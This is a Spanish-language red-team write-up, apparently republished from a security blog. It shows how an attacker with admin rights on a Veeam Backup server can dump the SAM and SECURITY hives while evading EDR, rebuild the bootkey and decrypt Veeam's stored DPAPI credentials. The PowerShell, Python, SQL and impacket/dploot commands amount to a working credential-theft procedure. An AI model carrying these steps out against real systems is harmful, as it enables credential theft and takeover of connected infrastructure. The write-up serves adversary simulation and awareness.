---
title: "Veeam Backup: de seguro de la organización a llave maestra del atacante"
date: 2025-05-05T09:57:36+00:00
draft: false
author: "j0su"
tags: ["veeam", "dpapi", "credential-access", "edr-bypass", "active-directory", "red-team"]
categories: ["writeups"]
summary: "Veeam Backup, ¿qué pasaría si esta solución de protección se convirtiera en la puerta de entrada para un actor malicioso? Dos aproximaciones para volcar la SAM y extraer las master keys de DPAPI evadiendo AV/EDR, usando Veeam como pivote hacia los servicios críticos."
cover:
  image: "image001.png"
  alt: "Veeam Backup: de seguro a llave maestra del atacante"
  relative: true
ShowToc: true
TocOpen: false
---

> Publicado originalmente en [Security Art Work](https://www.securityartwork.es/2025/05/05/veeam-backup/) (S2 Grupo) el 5 de mayo de 2025.

Muchos de vosotros seguro que conoceréis Veeam Backup, la solución de protección de datos que permite realizar copias de seguridad y recuperaciones en entornos virtuales, físicos, NAS y nativos de la nube. Esto se debe a que su facilidad de uso y eficiencia lo han convertido en un pilar fundamental en la estrategia de backup de muchas organizaciones.

En un contexto donde los ataques de ransomware están a la orden del día, Veeam Backup se ha consolidado como una herramienta esencial para la continuidad del negocio y la resiliencia ante la nueva oleada de amenazas que reciben las organizaciones de hoy en día.

Sin embargo, ¿qué pasaría si esta solución de protección se convirtiera en la puerta de entrada para un actor malicioso?

Una de las grandes ventajas de Veeam Backup es su capacidad para integrarse fácilmente con otras soluciones clave en entornos IT. Es común verlo conectado con vSphere, la plataforma de virtualización de VMware, o con sistemas NAS, utilizados para el almacenamiento de datos en red.

Además de ello, su compatibilidad con múltiples soluciones cloud ampliamente utilizadas, como es el caso de Azure, lo convierte en una pieza fundamental para la gestión eficiente y segura de copias de seguridad en la nube.

En el mundo IT, la automatización de tareas, especialmente cuando involucra la integración entre distintos softwares, conlleva beneficios significativos. Sin embargo, también implica ciertas condiciones, en su mayoría relacionadas con el proceso de autenticación. Es fundamental evaluar estos aspectos, ya que pueden influir en la seguridad, el control de acceso y la privacidad de los datos, por lo que es necesario sopesar sus ventajas y posibles riesgos antes de implementarlos.

En el caso de Veeam Backup, su funcionamiento requiere de credenciales que le permiten interactuar y acceder con los servicios mencionados previamente. Además, debido a las acciones que ejecuta, estas credenciales a menudo deben contar con un nivel elevado de privilegios.

Esto convierte a Veeam Backup en un objetivo especialmente atractivo para los actores maliciosos, no solo por su papel crítico en la infraestructura IT, sino también por el valor añadido que representa: el almacenamiento de credenciales que le permiten comunicarse con otros servicios.

Pero la pregunta es: ¿dónde almacena Veeam Backup estas credenciales?

Veeam Backup utiliza la base de datos *Veeam Backup & Replication Configuration Database* para almacenar información sobre la infraestructura de respaldo, las tareas, las sesiones y otros datos de configuración, como, por ejemplo, las credenciales utilizadas para la interconexión con otras soluciones.

Esta base de datos puede alojarse en un servidor Microsoft SQL Server (MSSQL) o PostgreSQL, ya sea de forma local, es decir, en el mismo servidor donde se ejecuta Veeam Backup, o de manera remota.

Dado que almacenar credenciales en texto claro no es una opción segura hoy en día, Veeam Backup utiliza la conocida Data Protection API (DPAPI) de Microsoft para cifrarlas y guardarlas como *blobs* (bloques) de datos.

Para quienes no estén familiarizados con esta tecnología, Data Protection API (DPAPI) es una interfaz de programación de aplicaciones utilizada en sistemas Windows, principalmente para operaciones de cifrado. Su uso más común es junto a Windows Credential Manager, donde se encarga de almacenar credenciales de navegadores, servicios como Remote Desktop Protocol (RDP) y otras aplicaciones.

Ahora bien, ¿cómo puede aprovechar un adversario esta situación?

Como bien es sabido, tanto los actores maliciosos como los operadores Red Team suelen tener un objetivo claro en mente y lo ejecutan de manera eficaz y sigilosa, evitando activar alarmas. Estos objetivos suelen estar relacionados con el compromiso de sistemas de almacenamiento de datos, copias de seguridad o incluso la implementación de activos. Por ello, dado el volumen de información crítica que gestiona la solución Veeam Backup (realización de backups, interacción con servicios críticos como vSphere…), puede convertirse en una brecha de alto impacto para la organización.

Un adversario busca cumplir su propósito perjudicando a la organización, por ejemplo, cifrando datos (**T1486**) para interrumpir la disponibilidad de las operaciones. Un operador Red Team, dentro del ámbito de un ejercicio de simulación de adversarios, tiene la misión de demostrar el impacto que un atacante real podría generar sobre el negocio de la organización que lo contrata, partiendo de un escenario y unos objetivos predefinidos.

Muchas organizaciones confían en diferentes tipos de soluciones de seguridad como los sistemas de Endpoint Detection and Response (EDR) para frenar este tipo de amenazas.

Sin embargo, ¿se ha considerado que tanto los actores maliciosos como los operadores de Red Team asumen la existencia de estas soluciones y diseñan sus tácticas y técnicas para evadirlas?

En esta ocasión, se presentarán dos aproximaciones utilizadas durante uno de los últimos ejercicios realizados, que han permitido el volcado de Security Account Manager (SAM) (**T1003.002**) y el acceso a las master keys utilizadas por el Data Protection API (DPAPI) para el cifrado y descifrado de blobs de datos en entornos que contaban con Antivirus (Windows Defender, BitDefender) y Endpoint Detection and Response (EDR) (CrowdStrike). Mediante estas dos aproximaciones un atacante podría usar Veeam Backup como puerta de entrada para comprometer y obtener el control de múltiples servicios críticos de la organización.

## Prueba de Concepto (PoC)

Es importante destacar que, para esta prueba de concepto (PoC), se asumirá que el atacante ya ha obtenido control con privilegios elevados sobre el equipo donde está desplegada la solución de Veeam Backup y tiene acceso a este.

También es importante destacar que el entorno donde se han realizado las pruebas contaba con el Endpoint Detection and Response (EDR) de CrowdStrike.

El primer paso es identificar el servidor donde está desplegada la solución de Veeam Backup. Una posible vía es el uso de BloodHound (**S0521**), una herramienta especializada en la enumeración de los entornos Active Directory (AD), que, entre otras cosas, permite visualizar los Service Principal Names (SPNs) asociados a los objetos del dominio.

![Enumeración de SPNs con BloodHound para localizar el servidor de Veeam](image003.png)

Una vez identificado el servidor, será necesario conectarse a la máquina objetivo, como, por ejemplo, mediante Remote Desktop Protocol (RDP) (**T1021.001**), utilizando una cuenta con privilegios elevados.

Tras esto, el siguiente paso será identificar la ubicación, el nombre (tanto de la instancia como de la propia base de datos) y el tipo de base de datos utilizada por Veeam Backup. Esto se consigue accediendo a la siguiente clave del registro de Windows:

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Veeam\Veeam Backup and Replication
```

A continuación, será necesario acceder (**T1005**) a la base de datos utilizando cualquier gestor de bases de datos compatible con Microsoft SQL Server (MSSQL) o PostgreSQL, dependiendo del tipo identificado previamente. Algunas herramientas portables útiles son:

- [Azure Data Studio](https://learn.microsoft.com/en-us/azure-data-studio/)
- [DBeaver](https://dbeaver.io/)

![Clave de registro con la configuración de la base de datos de Veeam](image005.png)

Conseguido el acceso, el siguiente paso será enumerar las credenciales almacenadas en la base de datos de Veeam Backup, las cuales se encuentran cifradas. Para su obtención, ejecutar la siguiente consulta SQL:

```sql
SELECT * FROM VeeamBackup.dbo.Credentials
```

![Credenciales cifradas almacenadas en la base de datos de Veeam](image007.png)

Una vez obtenidas las credenciales, se procederá con la segunda fase del ataque: la extracción de las master keys del Data Protection API (DPAPI), utilizadas para cifrar/descifrar las credenciales.

En esta ocasión, aprovechando los privilegios elevados sobre el activo donde está desplegado el servicio de Veeam Backup, se realizará un volcado de la Security Account Manager (SAM) (**T1003.002**). A partir de este volcado, se obtendrán los valores `DPAPI_MACHINEKEY` y `DPAPI_USERKEY`, los cuales serán utilizados para extraer las master keys asociadas a la cuenta máquina.

Para el volcado de la Security Account Manager (SAM) (**T1003.002**), se propone la siguiente aproximación:

Aprovechando el acceso por Remote Desktop Protocol (RDP) (**T1021.001**), se montará un recurso compartido en la máquina víctima, el cual contendrá la herramienta PsExec (**S0029**) de la suite de SysInternals de Microsoft.

A través de esta herramienta, será necesario ejecutar el RegEdit (Editor de Registros) con privilegios de `NT Authority\System`, ya que es necesaria la ejecución con este nivel de privilegios para el volcado de la Security Account Manager (SAM) (**T1003.002**).

```cmd
PsExec64.exe -s -i regedit
```

Una vez abierto el Editor de Registros, exportar en formato `.reg` los siguientes registros:

```text
HKEY_LOCAL_MACHINE\SAM
HKEY_LOCAL_MACHINE\SECURITY
```

![Exportación de las claves SAM y SECURITY desde RegEdit](image009.png)

Por otro lado, extraer en formato `.txt` el siguiente registro:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
```

![Exportación del registro LSA en formato texto](image011.png)

Para exportar claves, haz clic derecho sobre el registro, selecciona la opción *“Exportar”* y elige el formato para guardarlo (`.reg` o `.txt`).

![Menú contextual de exportación en RegEdit](image013.png)

Dado que los registros `SAM` y `SECURITY` solo pueden volcarse en formato binario, se utiliza el siguiente script de PowerShell para reubicarlos temporalmente bajo `HKCU\HELLO`, reimportarlos y guardarlos como ficheros `.hive`, evitando así las protecciones que vigilan el acceso directo a estas claves:

```powershell
# Ubicación de los ficheros exportados
$files = @(
    "C:\Users\Public\Documents\sam.reg",
    "C:\Users\Public\Documents\sec.reg"
)

# Modificar la ubicación de los registros
Write-Output "Switching HKLM\ to HKCU\HELLO in .reg files"
foreach ($filePath in $files) {
    $content = Get-Content -Path $filePath -Raw -Encoding Unicode
    $replacement = [char[]] "HKEY_CURRENT_USER\HELLO" -join ''
    $updatedContent = $content -replace "HKEY_LOCAL_MACHINE", $replacement
    Set-Content -Path $filePath -Value $updatedContent -Encoding Unicode
    Write-Output "`tUpdated file: $filePath"
}

# Importar los registros a la nueva ubicación
Write-Output "Importing modified .reg files in HKCU\HELLO"
reg import C:\Users\Public\Documents\sam.reg
reg import C:\Users\Public\Documents\sec.reg

# Obtener los registros mediante reg save
Write-Output "Reg saving back to .hive"
reg save HKEY_CURRENT_USER\HELLO\SAM C:\Users\Public\Documents\SAM.hive
reg save HKEY_CURRENT_USER\HELLO\SECURITY C:\Users\Public\Documents\SECURITY.hive

# Eliminar la clave temporal
Write-Output "Removing temporary HKCU\HELLO hives"
reg delete HKEY_CURRENT_USER\HELLO /f
```

Por otro lado, del registro LSA exportado en formato `.txt`, se deberán extraer los siguientes valores almacenados en el atributo *Class Name*:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\GBG
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Data
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\JD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Skew1
```

![Valores Class Name de las claves LSA: GBG, Data, JD y Skew1](image015.png)

Los valores obtenidos en el paso previo deberán de ser introducidos en el siguiente script con el propósito de obtener la BootKey que permita el desencriptado de los datos del volcado de Security Account Manager (SAM) (**T1003.002**) realizado.

```python
# Valores hexadecimales para JD, Skew1, GBG y Datos
jd = bytes.fromhex("$JD")
skew1 = bytes.fromhex("$SKEW1")
gbg = bytes.fromhex("$GBG")
data = bytes.fromhex("$DATA")

# Combinar los datos binarios
combined = jd + skew1 + gbg + data

# Tabla de permutación para la Bootkey
permutation = [0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7]

# Reorganizar los bytes para generar la Bootkey
bootkey = bytes([combined[i] for i in permutation])

# Imprimir la Bootkey en formato hexadecimal
print("Bootkey:", bootkey.hex())
```

![Obtención de la BootKey a partir de los valores de LSA](image017.png)

Finalmente, será posible acceder a los hashes almacenados en la Security Account Manager (SAM) de forma local. Esto es posible con herramientas como impacket-secretsdump (**S0357**) o similares.

```bash
impacket-secretsdump -sam SAM.hive -security SECURITY.hive -bootkey $BOOTKEY LOCAL
```

De entre los valores obtenidos, son necesarias las claves mencionadas previamente: `DPAPI_MACHINEKEY` y `DPAPI_USERKEY`, que serán utilizadas para la extracción de las master keys de la cuenta máquina. Esta extracción se realizará mediante la herramienta [dploot](https://github.com/zblurx/dploot).

Esta herramienta permite la interacción con el Windows Credential Manager y Data Protection API (DPAPI) de forma local, es decir, es posible montar en una máquina controlada el sistema de archivos de la máquina víctima y con la herramienta realizar la extracción de las master keys, por ejemplo.

Para el montaje del sistema de archivos, esta es una posible aproximación:

```bash
sudo mount -t cifs //$IP/$RECURSO /mnt/tmp -o username=$USUARIO,password=$CONTRASEÑA,domain=$DOMINIO
```

Montado el sistema de archivos de la máquina víctima, se deberá de realizar la extracción de las master keys de la cuenta máquina, ya que estas son las claves con las que Veeam Backup cifra las credenciales, por lo que son necesarias para el descifrado.

```bash
dploot machinemasterkeys -root /mnt/tmp -u $USUARIO -p $PASSWORD -t LOCAL \
  -dpapi-system-key 'dpapi_machinekey:$DPAPI_MACHINEKEY,dpapi_userkey:$DPAPI_USERKEY'
```

![Extracción de las master keys de la cuenta máquina con dploot](image019.png)

Una vez extraídas las master keys, el último paso es descifrar los blobs de datos, siendo estos las credenciales obtenidas previamente del *Veeam Backup & Replication Configuration Database*.

La herramienta lleva a cabo un proceso similar a un ataque de fuerza bruta, probando cada una de las master keys almacenadas en el archivo proporcionado contra el blob hasta encontrar la clave correcta que permita descifrar la credencial.

```bash
dploot blob -blob "$BLOB" -mkfile $ARCHIVO_MASTERKEYS -t LOCAL
```

![Descifrado del blob y obtención de la credencial en claro](image022.png)

Tras esto, es posible acceder a todos los servicios críticos conectados con el servicio de Veeam Backup, consiguiendo control y privilegios elevados sobre el entorno IT y siendo capaz de centrar sus objetivos en el negocio de la organización.

## Conclusión

Este ejemplo ha evidenciado cómo un adversario puede llegar a tomar el control de la infraestructura IT de una organización, incluso cuando esta cuenta con una solución de seguridad implementada, como es el caso de un Endpoint Detection and Response (EDR).

Se ha demostrado cómo un software diseñado originalmente para proteger los datos de la organización contra ataques, como el ransomware, puede convertirse en una vía de acceso para los atacantes, permitiéndoles comprometer múltiples servicios críticos, generando una brecha de alto impacto para la organización.

## Recursos adicionales

- [dploot](https://github.com/zblurx/dploot)
- [Bypassing EDR to dump LSA secrets](https://www.orangecyberdefense.com/global/blog/cybersecurity/bypassing-edr-to-dump-lsa-secrets)
